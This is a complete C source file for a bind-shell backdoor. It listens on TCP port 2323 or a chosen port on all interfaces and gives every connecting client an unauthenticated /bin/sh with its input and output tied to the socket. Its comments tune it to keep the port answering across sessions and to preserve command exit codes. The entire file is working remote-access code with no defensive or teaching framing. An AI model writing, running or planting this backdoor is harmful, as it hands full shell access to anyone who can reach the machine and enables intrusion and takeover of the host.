#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char *argv[]) {
    int port = 2323;
    if (argc > 1) {
        port = atoi(argv[1]);
    }

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        exit(1);
    }

    int reuse = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) < 0) {
        perror("setsockopt");
        exit(1);
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(port);

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        exit(1);
    }

    if (listen(server_fd, 4) < 0) {
        perror("listen");
        exit(1);
    }

    /* The listener stays in this process and every client gets its own shell, so the port
     * keeps answering after a session ends. Ignoring SIGCHLD lets the kernel reap them. */
    signal(SIGCHLD, SIG_IGN);

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
        if (client_fd < 0) {
            perror("accept");
            continue;
        }

        pid_t pid = fork();
        if (pid < 0) {
            perror("fork");
            close(client_fd);
            continue;
        }
        if (pid > 0) {
            close(client_fd);
            continue;
        }

        close(server_fd);
        /* An ignored SIGCHLD survives exec and would make every wait() in the shell fail, so $?
         * of its commands would be lost. */
        signal(SIGCHLD, SIG_DFL);
        if (dup2(client_fd, 0) < 0 || dup2(client_fd, 1) < 0 || dup2(client_fd, 2) < 0) {
            perror("dup2");
            _exit(1);
        }
        close(client_fd);
        execl("/bin/sh", "sh", (char *)NULL);
        perror("execl");
        _exit(1);
    }

    return 0;
}
